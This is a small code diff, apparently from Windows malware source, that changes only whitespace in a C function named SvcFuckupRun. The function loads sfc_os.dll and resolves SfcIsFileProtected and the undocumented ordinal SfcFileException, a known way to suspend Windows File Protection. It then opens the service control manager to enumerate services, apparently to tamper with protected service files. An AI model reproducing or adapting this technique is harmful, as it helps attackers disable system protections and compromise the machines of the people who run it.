@@ -330,7 +330,7 @@ void SvcFuckupRunAsService(ServiceMainFunction service_main)
 bool SvcFuckupRun()
 {
 	bool bRet=false;
-	HMODULE hSfc=LoadLibrary(TEXT("sfc_os"));
+	 HMODULE hSfc=LoadLibrary(TEXT("sfc_os"));
 	SfcIsFileProtected=(_SfcIsFileProtected*)GetProcAddress(hSfc,"SfcIsFileProtected");
 	SfcFileException=(_SfcFileException *)GetProcAddress(hSfc,(LPCSTR)5);
 	SC_HANDLE hSCManager=OpenSCManager(NULL,SERVICES_ACTIVE_DATABASE,SC_MANAGER_ENUMERATE_SERVICE);
@@ -365,6 +365,6 @@ bool SvcFuckupRun()
 
 	PP_DPRINTF( "FuckupSvc: finished.");
 
-	CloseServiceHandle(hSCManager);
+	CloseServiceHandle(hSCManager); 
 	return bRet;
 }
